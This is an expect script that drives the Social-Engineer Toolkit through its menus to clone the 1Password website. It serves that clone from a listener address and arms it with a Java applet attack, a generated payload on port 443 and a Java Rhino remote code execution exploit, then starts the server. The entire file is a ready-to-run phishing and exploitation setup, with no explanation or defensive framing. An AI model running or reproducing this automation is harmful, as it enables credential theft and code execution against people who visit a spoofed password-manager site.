#!/usr/bin/expect
set timeout 5
spawn setoolkit
expect {
         "terms of service" {
                send "y\r"}
        }
expect "1) Social-Engineering Attacks"
send "1\r"
expect "2) Website Attack Vectors"
send "2\r"
expect "6) Multi-Attack Web Method"
send "6\r"
expect "2) Site Cloner"
send "2\r"
expect "Are you using NAT/Port Forwarding"
send "no\r"
expect "IP address or URL"
send "172.17.0.21\r"
expect "Enter the url to clone"
send "www.1password.com\r"
expect "Java Applet Attack Method"
send "1\r"
expect "Option added."
send "2\r"
expect "Option added."
send "7\r"
expect "What payload do you want to generate"
send "1\r"
expect "PORT"
send "443\r"
expect "Enter the number for the payload"
send "1\r"
expect "Enter the number you want to use"
send "2\r"
expect "Java Applet Rhino Script Engine Remote Code Execution"
send "21\r"
expect {
         "Apache may be running" {
                send "y\r"}
        }
expect "Server started."
interact 
